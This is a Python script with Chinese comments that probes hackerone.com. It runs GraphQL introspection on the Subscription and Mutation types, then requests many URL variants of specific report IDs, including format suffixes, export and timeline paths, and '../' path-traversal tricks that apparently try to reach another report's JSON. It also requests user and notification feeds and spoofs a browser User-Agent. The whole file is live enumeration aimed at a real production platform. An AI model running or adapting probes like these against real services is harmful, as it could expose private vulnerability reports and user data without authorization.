# -*- coding: utf-8 -*-
"""h1x43: 剩余机制面一次清
1) Subscription 类型 introspection(报告订阅?)
2) REST 格式变体 .xml/.js/export/print/timeline
3) 路径规范化 /reports/3732660/../3992341.json
4) 老 Rails users/me.json users/{name}.json reports/{id}.atom"""
import sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

print('--- 1) Subscription 类型 ---')
for t in ['Subscription', 'Mutation']:
    r = s.post('https://hackerone.com/graphql', json={'query': f'{{ __type(name: "{t}") {{ fields(includeDeprecated: true) {{ name }} }} }}'}, timeout=20)
    txt = r.text
    print(f'{t}: {txt[:600]}')
    print()

print('--- 2/3/4) REST 变体 ---')
urls = [
    'https://hackerone.com/reports/3732660.xml',
    'https://hackerone.com/reports/3732660.js',
    'https://hackerone.com/reports/3732660.export',
    'https://hackerone.com/reports/3732660/export',
    'https://hackerone.com/reports/3732660/print',
    'https://hackerone.com/reports/3732660/timeline',
    'https://hackerone.com/reports/3732660/timeline.csv',
    'https://hackerone.com/reports/3732660.atom',
    'https://hackerone.com/reports/3992341/../../reports/3732660.json',
    'https://hackerone.com/reports/3732660/../3992341.json',
    'https://hackerone.com/reports/3732660.json/../3992341.json',
    'https://hackerone.com/users/me.json',
    'https://hackerone.com/users/bate5a.json',
    'https://hackerone.com/notifications.atom',
    'https://hackerone.com/activity.atom',
]
for u in urls:
    try:
        r = s.get(u, timeout=15, allow_redirects=False)
        ct = r.headers.get('content-type', '')[:35]
        loc = r.headers.get('location', '')
        body = r.text[:90].replace('\n', ' ')
        print(f'[{r.status_code}] {u.replace("https://hackerone.com", "")} ct={ct} loc={loc[:50]} body={body}')
    except Exception as e:
        print(f'[ERR] {u} {e}')
